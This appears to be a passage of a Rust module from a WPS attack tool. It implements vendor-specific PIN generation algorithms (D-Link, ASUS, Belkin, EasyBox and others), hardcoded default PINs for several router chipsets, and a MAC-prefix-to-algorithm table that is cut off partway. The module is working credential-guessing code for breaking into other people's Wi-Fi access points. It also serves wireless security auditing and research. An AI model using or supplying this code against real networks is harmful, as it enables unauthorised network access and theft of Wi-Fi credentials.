//! WPS PIN generation algorithms — compute candidate PINs from MAC address and serial number.
//!
//! Implements all known vendor-specific PIN generation algorithms from OneShot/WPSpin/Reaver
//! plus a complete OUI→algorithm mapping database (~170 prefixes).
//!
//! References:
//! - drygdryg/WPSpin (Python WPS PIN generator)
//! - kimocoder/OneShot (WPS attack tool with integrated PIN generator)
//! - devttys0/wps (D-Link and Belkin PIN generators by Craig Heffner)
//! - SEC Consult EasyBox Advisory (Arcadyan/Vodafone)
//! - kcdtv/WPSPIN (Shell-based WPS PIN generator)

use crate::core::MacAddress;
use crate::protocol::wps::wps_pin_checksum;

// ═══════════════════════════════════════════════════════════════════════════════
//  Public types
// ═══════════════════════════════════════════════════════════════════════════════

/// Which algorithm produced a candidate PIN.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PinAlgo {
    // MAC-based computed PINs
    Pin24,
    Pin28,
    Pin32,
    DLink,
    DLink1,
    Asus,
    Airocon,
    EasyBox,
    Belkin,
    // Static PINs
    Cisco,
    Brcm1,
    Brcm2,
    Brcm3,
    Brcm4,
    Brcm5,
    Brcm6,
    Airc1,
    Airc2,
    Dsl2740r,
    Realtek1,
    Realtek2,
    Realtek3,
    Upvel,
    Ur814ac,
    Ur825ac,
    Onlime,
    Edimax,
    Thomson,
    Hg532x,
    H108l,
    Ono,
}

impl PinAlgo {
    pub fn name(&self) -> &'static str {
        match self {
            Self::Pin24 => "24-bit",
            Self::Pin28 => "28-bit",
            Self::Pin32 => "32-bit",
            Self::DLink => "D-Link",
            Self::DLink1 => "D-Link+1",
            Self::Asus => "ASUS",
            Self::Airocon => "Airocon",
            Self::EasyBox => "EasyBox",
            Self::Belkin => "Belkin",
            Self::Cisco => "Cisco",
            Self::Brcm1 => "Broadcom1",
            Self::Brcm2 => "Broadcom2",
            Self::Brcm3 => "Broadcom3",
            Self::Brcm4 => "Broadcom4",
            Self::Brcm5 => "Broadcom5",
            Self::Brcm6 => "Broadcom6",
            Self::Airc1 => "Airocon1",
            Self::Airc2 => "Airocon2",
            Self::Dsl2740r => "DSL-2740R",
            Self::Realtek1 => "Realtek1",
            Self::Realtek2 => "Realtek2",
            Self::Realtek3 => "Realtek3",
            Self::Upvel => "Upvel",
            Self::Ur814ac => "UR-814AC",
            Self::Ur825ac => "UR-825AC",
            Self::Onlime => "Onlime",
            Self::Edimax => "Edimax",
            Self::Thomson => "Thomson",
            Self::Hg532x => "HG532x",
            Self::H108l => "H108L",
            Self::Ono => "CBN/ONO",
        }
    }

    /// Whether this algorithm requires a serial number.
    pub fn needs_serial(&self) -> bool {
        matches!(self, Self::Belkin)
    }
}

impl std::fmt::Display for PinAlgo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

/// A candidate WPS PIN produced by a generation algorithm.
#[derive(Debug, Clone)]
pub struct PinCandidate {
    /// 8-digit PIN string with checksum (e.g., "12345670").
    pub pin: String,
    /// Which algorithm produced this PIN.
    pub algo: PinAlgo,
    /// Confidence score (0-100). Higher = more specific OUI match.
    pub confidence: u8,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Entry point
// ═══════════════════════════════════════════════════════════════════════════════

/// Generate candidate WPS PINs for a given MAC address and optional serial number.
///
/// Returns candidates sorted by confidence (highest first), deduplicated by PIN value.
/// Typically returns 0-15 candidates depending on OUI matches.
pub fn generate_pins(mac: &MacAddress, serial: Option<&str>) -> Vec<PinCandidate> {
    let matches = match_algorithms(mac);

    // Fallback: when no OUI match, try generic MAC-based algorithms
    // These are purely mathematical — work for any MAC address
    let matches = if matches.is_empty() {
        vec![
            (PinAlgo::Pin24, 30),
            (PinAlgo::Pin28, 30),
            (PinAlgo::Pin32, 30),
        ]
    } else {
        matches
    };

    let b = mac.as_bytes();
    let mac_int = mac_to_u64(b);

    let mut candidates = Vec::new();

    for (algo, confidence) in matches {
        let pin7 = match algo {
            PinAlgo::Pin24 => Some(compute_pin24(mac_int)),
            PinAlgo::Pin28 => Some(compute_pin28(mac_int)),
            PinAlgo::Pin32 => Some(compute_pin32(mac_int)),
            PinAlgo::DLink => Some(compute_dlink(mac_int)),
            PinAlgo::DLink1 => Some(compute_dlink(mac_int + 1)),
            PinAlgo::Asus => compute_asus(b),
            PinAlgo::Airocon => Some(compute_airocon(b)),
            PinAlgo::EasyBox => compute_easybox(b),
            PinAlgo::Belkin => {
                if let Some(sn) = serial {
                    compute_belkin(b, sn)
                } else {
                    None
                }
            }
            // Static PINs
            PinAlgo::Cisco => Some(1234567),
            PinAlgo::Brcm1 => Some(2017252),
            PinAlgo::Brcm2 => Some(4626484),
            PinAlgo::Brcm3 => Some(7622990),
            PinAlgo::Brcm4 => Some(6232714),
            PinAlgo::Brcm5 => Some(1086411),
            PinAlgo::Brcm6 => Some(3195719),
            PinAlgo::Airc1 => Some(3043203),
            PinAlgo::Airc2 => Some(7141225),
            PinAlgo::Dsl2740r => Some(6817554),
            PinAlgo::Realtek1 => Some(9566146),
            PinAlgo::Realtek2 => Some(9571911),
            PinAlgo::Realtek3 => Some(4856371),
            PinAlgo::Upvel => Some(2085483),
            PinAlgo::Ur814ac => Some(4397768),
            PinAlgo::Ur825ac => Some(529417),
            PinAlgo::Onlime => Some(9995604),
            PinAlgo::Edimax => Some(3561153),
            PinAlgo::Thomson => Some(6795814),
            PinAlgo::Hg532x => Some(3425928),
            PinAlgo::H108l => Some(9422988),
            PinAlgo::Ono => Some(9575521),
        };

        if let Some(p7) = pin7 {
            let chk = wps_pin_checksum(p7);
            let pin8 = p7 * 10 + chk as u32;
            let pin_str = format!("{:08}", pin8);
            candidates.push(PinCandidate {
                pin: pin_str,
                algo,
                confidence,
            });
        }
    }

    // Deduplicate by PIN value, keeping highest confidence
    candidates.sort_by(|a, b| b.confidence.cmp(&a.confidence));
    let mut seen = std::collections::HashSet::new();
    candidates.retain(|c| seen.insert(c.pin.clone()));

    candidates
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MAC-based algorithms
// ═══════════════════════════════════════════════════════════════════════════════

fn mac_to_u64(b: &[u8; 6]) -> u64 {
    (b[0] as u64) << 40
        | (b[1] as u64) << 32
        | (b[2] as u64) << 24
        | (b[3] as u64) << 16
        | (b[4] as u64) << 8
        | (b[5] as u64)
}

/// 24-bit PIN: lower 24 bits (NIC) of MAC, mod 10^7.
fn compute_pin24(mac: u64) -> u32 {
    ((mac & 0xFFFFFF) as u32) % 10_000_000
}

/// 28-bit PIN: lower 28 bits of MAC, mod 10^7.
fn compute_pin28(mac: u64) -> u32 {
    ((mac & 0xFFFFFFF) as u32) % 10_000_000
}

/// 32-bit PIN: lower 32 bits of MAC, mod 10^7.
fn compute_pin32(mac: u64) -> u32 {
    ((mac & 0xFFFFFFFF) as u32) % 10_000_000
}

/// D-Link PIN algorithm (Craig Heffner / devttys0).
/// NIC XOR 0x55AA55, then XOR with shifted nibble additions.
fn compute_dlink(mac: u64) -> u32 {
    let nic = (mac & 0xFFFFFF) as u32;
    let mut pin = nic ^ 0x55AA55;
    let low = pin & 0x0F;
    // NOTE: original Python uses addition, not bitwise OR
    pin ^= (low << 4)
        .wrapping_add(low << 8)
        .wrapping_add(low << 12)
        .wrapping_add(low << 16)
        .wrapping_add(low << 20);
    pin %= 10_000_000;
    if pin < 1_000_000 {
        pin += ((pin % 9) * 1_000_000) + 1_000_000;
    }
    pin
}

/// ASUS PIN algorithm: digit-by-digit from MAC bytes.
/// digit[i] = (b[i%6] + b[5]) % (10 - (i + b[1]+b[2]+b[3]+b[4]+b[5]) % 7)
fn compute_asus(b: &[u8; 6]) -> Option<u32> {
    let sum_tail = b[1] as u32 + b[2] as u32 + b[3] as u32 + b[4] as u32 + b[5] as u32;
    let mut pin: u32 = 0;
    for i in 0u32..7 {
        let divisor = 10u32.wrapping_sub((i + sum_tail) % 7);
        if divisor == 0 {
            return None; // avoid divide by zero
        }
        let digit = (b[(i as usize) % 6] as u32 + b[5] as u32) % divisor;
        if digit > 9 {
            return None; // invalid digit
        }
        pin = pin * 10 + digit;
    }
    Some(pin % 10_000_000)
}

/// Airocon/Realtek PIN: adjacent MAC byte pairs mod 10.
fn compute_airocon(b: &[u8; 6]) -> u32 {
    let d6 = (b[0] as u32 + b[1] as u32) % 10;
    let d5 = (b[1] as u32 + b[2] as u32) % 10;
    let d4 = (b[2] as u32 + b[3] as u32) % 10;
    let d3 = (b[3] as u32 + b[4] as u32) % 10;
    let d2 = (b[4] as u32 + b[5] as u32) % 10;
    let d1 = (b[5] as u32 + b[0] as u32) % 10;
    let d0 = (b[0] as u32 + b[1] as u32) % 10;
    d6 * 1_000_000 + d5 * 100_000 + d4 * 10_000 + d3 * 1_000 + d2 * 100 + d1 * 10 + d0
}

/// EasyBox/Arcadyan: derives serial from MAC bytes 4-5, then XOR-based computation.
fn compute_easybox(b: &[u8; 6]) -> Option<u32> {
    // MAC as hex string (uppercase, no delimiters)
    let mac_hex = format!("{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}", b[0], b[1], b[2], b[3], b[4], b[5]);
    let mac_nib: Vec<u32> = mac_hex.chars().map(|c| c.to_digit(16).unwrap()).collect();

    // Derive serial from last 2 MAC bytes
    let sn_val = (b[4] as u16) << 8 | b[5] as u16;
    let sn_str = format!("{:05}", sn_val);
    let sn: Vec<u32> = sn_str.chars().map(|c| c.to_digit(10).unwrap()).collect();

    // sn[0..5] maps to original notation sn_int[5..10]
    let k1 = (sn[1] + sn[2] + mac_nib[10] + mac_nib[11]) & 0xF;
    let k2 = (sn[3] + sn[4] + mac_nib[8] + mac_nib[9]) & 0xF;

    let hpin = [
        k1 ^ sn[4],
        k1 ^ sn[3],
        k2 ^ mac_nib[9],
        k2 ^ mac_nib[10],
        mac_nib[10] ^ sn[4],
        mac_nib[11] ^ sn[3],
        k1 ^ sn[2],
    ];

    // Format each as hex digit, concatenate, parse as hex, mod 10^7
    let hex_str: String = hpin.iter().map(|d| format!("{:X}", d)).collect();
    let val = u32::from_str_radix(&hex_str, 16).ok()?;
    Some(val % 10_000_000)
}

/// Belkin PIN: requires serial number from WPS IE.
/// Uses last 4 hex chars of MAC and last 4 chars of serial.
fn compute_belkin(b: &[u8; 6], serial: &str) -> Option<u32> {
    if serial.len() < 4 {
        return None;
    }

    let mac_hex = format!("{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}", b[0], b[1], b[2], b[3], b[4], b[5]);

    // Last 4 hex digits of MAC (reversed order)
    let mac_chars: Vec<u8> = mac_hex.bytes().collect();
    let ml = mac_chars.len();
    let nic = [
        hex_val(mac_chars[ml - 1])?,
        hex_val(mac_chars[ml - 2])?,
        hex_val(mac_chars[ml - 3])?,
        hex_val(mac_chars[ml - 4])?,
    ];

    // Last 4 chars of serial (reversed order, as hex digits)
    let sn_bytes: Vec<u8> = serial.bytes().collect();
    let sl = sn_bytes.len();
    let sn = [
        hex_val(sn_bytes[sl - 1])?,
        hex_val(sn_bytes[sl - 2])?,
        hex_val(sn_bytes[sl - 3])?,
        hex_val(sn_bytes[sl - 4])?,
    ];

    let k1 = (sn[2] + sn[3] + nic[0] + nic[1]) % 16;
    let k2 = (sn[0] + sn[1] + nic[3] + nic[2]) % 16;

    let pin_d = k1 ^ sn[1];
    let t1 = k1 ^ sn[0];
    let t2 = k2 ^ nic[1];
    let p1 = nic[0] ^ sn[1] ^ t1;
    let p2 = k2 ^ nic[0] ^ t2;
    let p3 = k1 ^ sn[2] ^ k2 ^ nic[2];
    let k1f = k1 ^ k2;

    let mut pin = (pin_d ^ k1f) as u32;
    pin = pin * 16 + t1 as u32;
    pin = pin * 16 + p1 as u32;
    pin = pin * 16 + t2 as u32;
    pin = pin * 16 + p2 as u32;
    pin = pin * 16 + k1f as u32;
    pin = pin * 16 + p3 as u32;
    pin %= 10_000_000;

    Some(pin)
}

fn hex_val(ch: u8) -> Option<u32> {
    match ch {
        b'0'..=b'9' => Some((ch - b'0') as u32),
        b'a'..=b'f' => Some((ch - b'a' + 10) as u32),
        b'A'..=b'F' => Some((ch - b'A' + 10) as u32),
        _ => None,
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  OUI → Algorithm mapping database
// ═══════════════════════════════════════════════════════════════════════════════

/// Entry in the OUI database: hex prefix string → algorithm.
struct OuiEntry {
    prefix: &'static str,
    algo: PinAlgo,
}

/// Match a MAC address against the OUI database.
/// Returns (algorithm, confidence) pairs. Confidence is based on prefix length:
/// - 6 chars (3 bytes, standard OUI): 60
/// - 7 chars: 75
/// - 8+ chars: 90
fn match_algorithms(mac: &MacAddress) -> Vec<(PinAlgo, u8)> {
    let b = mac.as_bytes();
    let mac_hex = format!("{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}", b[0], b[1], b[2], b[3], b[4], b[5]);

    let mut matches = Vec::new();

    for entry in OUI_DATABASE {
        if mac_hex.starts_with(entry.prefix) {
            let confidence = match entry.prefix.len() {
                0..=6 => 60,
                7 => 75,
                _ => 90,
            };
            matches.push((entry.algo, confidence));
        }
    }

    matches
}

// The complete OUI database from OneShot/WPSpin.
// Each entry maps a MAC hex prefix (uppercase, no delimiters) to an algorithm.
static OUI_DATABASE: &[OuiEntry] = &[
    // ── pin24 (24-bit / ComputePIN) ──
    OuiEntry { prefix: "04BF6D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "0E5D4E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "107BEF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "14A9E3", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "28285D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "2A285D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "32B2DC", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "381766", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "404A03", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "4E5D4E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "5067F0", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "5CF4AB", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A285D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "8E5D4E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "AA285D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "B0B2DC", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "C86C87", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "CC5D4E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "CE5D4E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "EA285D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "E243F6", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "EC43F6", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "EE43F6", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "F2B2DC", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "FCF528", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "FEF528", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "4C9EFF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "0014D1", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "D8EB97", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "FC7516", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "14D64D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "9094E4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "C4A81D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "00664B", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "087A4C", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "14B968", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "2008ED", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "346BD3", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "4CEDDE", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "786A89", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "88E3AB", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "D46E5C", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "E8CD2D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "EC233D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "ECCB30", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "F49FF3", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "20CF30", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "90E6BA", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "E0CB4E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "D4BF7F4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "F8C091", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "001CDF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "002275", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "08863B", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "00B00C", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "081075", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "C83A35", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "0022F7", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "001F1F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "00265B", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "68B6CF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "788DF7", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "BC1401", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "202BC1", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "308730", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "5C4CA9", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62233D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "623CE4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "623DFF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6253D4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62559C", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "626BD3", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "627D5E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6296BF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62A8E4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62B686", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62C06F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62C61F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62C714", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62CBA8", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62CDBE", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "62E87B", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6416F0", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A1D67", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A233D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A3DFF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A53D4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A559C", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A6BD3", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A96BF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6A7D5E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6AA8E4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6AC06F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6AC61F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6AC714", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6ACBA8", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6ACDBE", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6AD15E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "6AD167", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "721D67", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72233D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "723CE4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "723DFF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "7253D4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72559C", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "726BD3", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "727D5E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "7296BF", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72A8E4", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72C06F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72C61F", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72C714", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72CBA8", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72CDBE", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72D15E", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "72E87B", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "0026CE", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "9897D1", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "E04136", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "B246FC", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "E24136", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "00E020", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "5CA39D", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "D86CE9", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "DC7144", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "801F02", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "E47CF9", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "000CF6", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "00A026", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "A0F3C1", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "647002", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "B0487A", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "F81A67", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "F8D111", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "34BA9A", algo: PinAlgo::Pin24 },
    OuiEntry { prefix: "B4944E", algo: PinAlgo::Pin24 },

    // ── pin28 ──
    OuiEntry { prefix: "200BC7", algo: PinAlgo::Pin28 },
    OuiEntry { prefix: "4846FB", algo: PinAlgo::Pin28 },
    OuiEntry { prefix: "D46AA8", algo: PinAlgo::Pin28 },
    OuiEntry { prefix: "F84ABF", algo: PinAlgo::Pin28 },

    // ── pin32 ──
    OuiEntry { prefix: "000726", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "D8FEE3", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "FC8B97", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "1062EB", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "1C5F2B", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "48EE0C", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "802689", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "908D78", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "E8CC18", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "2CAB25", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "10BF48", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "14DAE9", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "3085A9", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "50465D", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "5404A6", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "C86000", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "F46D04", algo: PinAlgo::Pin32 },
    OuiEntry { prefix: "801F02", algo: PinAlgo::Pin32 },

    // ── pinDLink ──
    OuiEntry { prefix: "14D64D", algo: PinAlgo::DLink },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::DLink },
    OuiEntry { prefix: "28107B", algo: PinAlgo::DLink },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::DLink },
    OuiEntry { prefix: "A0AB1B", algo: PinAlgo::DLink },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::DLink },
    OuiEntry { prefix: "C0A0BB", algo: PinAlgo::DLink },
    OuiEntry { prefix: "CCB255", algo: PinAlgo::DLink },
    OuiEntry { prefix: "FC7516", algo: PinAlgo::DLink },
    OuiEntry { prefix: "0014D1", algo: PinAlgo::DLink },
    OuiEntry { prefix: "D8EB97", algo: PinAlgo::DLink },

    // ── pinDLink1 (MAC+1) ──
    OuiEntry { prefix: "0018E7", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "00195B", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "001CF0", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "001E58", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "002191", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "0022B0", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "002401", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "00265A", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "14D64D", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "340804", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "5CD998", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "C8BE19", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "C8D3A3", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "CCB255", algo: PinAlgo::DLink1 },
    OuiEntry { prefix: "0014D1", algo: PinAlgo::DLink1 },

    // ── pinASUS ──
    OuiEntry { prefix: "049226", algo: PinAlgo::Asus },
    OuiEntry { prefix: "04D9F5", algo: PinAlgo::Asus },
    OuiEntry { prefix: "08606E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "0862669", algo: PinAlgo::Asus },
    OuiEntry { prefix: "107B44", algo: PinAlgo::Asus },
    OuiEntry { prefix: "10BF48", algo: PinAlgo::Asus },
    OuiEntry { prefix: "10C37B", algo: PinAlgo::Asus },
    OuiEntry { prefix: "14DDA9", algo: PinAlgo::Asus },
    OuiEntry { prefix: "1C872C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "1CB72C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "2C56DC", algo: PinAlgo::Asus },
    OuiEntry { prefix: "2CFDA1", algo: PinAlgo::Asus },
    OuiEntry { prefix: "305A3A", algo: PinAlgo::Asus },
    OuiEntry { prefix: "382C4A", algo: PinAlgo::Asus },
    OuiEntry { prefix: "38D547", algo: PinAlgo::Asus },
    OuiEntry { prefix: "40167E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "50465D", algo: PinAlgo::Asus },
    OuiEntry { prefix: "54A050", algo: PinAlgo::Asus },
    OuiEntry { prefix: "6045CB", algo: PinAlgo::Asus },
    OuiEntry { prefix: "60A44C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "704D7B", algo: PinAlgo::Asus },
    OuiEntry { prefix: "74D02B", algo: PinAlgo::Asus },
    OuiEntry { prefix: "7824AF", algo: PinAlgo::Asus },
    OuiEntry { prefix: "88D7F6", algo: PinAlgo::Asus },
    OuiEntry { prefix: "9C5C8E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "AC220B", algo: PinAlgo::Asus },
    OuiEntry { prefix: "AC9E17", algo: PinAlgo::Asus },
    OuiEntry { prefix: "B06EBF", algo: PinAlgo::Asus },
    OuiEntry { prefix: "BCEE7B", algo: PinAlgo::Asus },
    OuiEntry { prefix: "C860007", algo: PinAlgo::Asus },
    OuiEntry { prefix: "D017C2", algo: PinAlgo::Asus },
    OuiEntry { prefix: "D850E6", algo: PinAlgo::Asus },
    OuiEntry { prefix: "E03F49", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F0795978", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F832E4", algo: PinAlgo::Asus },
    OuiEntry { prefix: "00072624", algo: PinAlgo::Asus },
    OuiEntry { prefix: "0008A1D3", algo: PinAlgo::Asus },
    OuiEntry { prefix: "00177C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "001EA6", algo: PinAlgo::Asus },
    OuiEntry { prefix: "00304FB", algo: PinAlgo::Asus },
    OuiEntry { prefix: "00E04C0", algo: PinAlgo::Asus },
    OuiEntry { prefix: "048D38", algo: PinAlgo::Asus },
    OuiEntry { prefix: "081077", algo: PinAlgo::Asus },
    OuiEntry { prefix: "081078", algo: PinAlgo::Asus },
    OuiEntry { prefix: "081079", algo: PinAlgo::Asus },
    OuiEntry { prefix: "083E5D", algo: PinAlgo::Asus },
    OuiEntry { prefix: "10FEED3C", algo: PinAlgo::Asus },
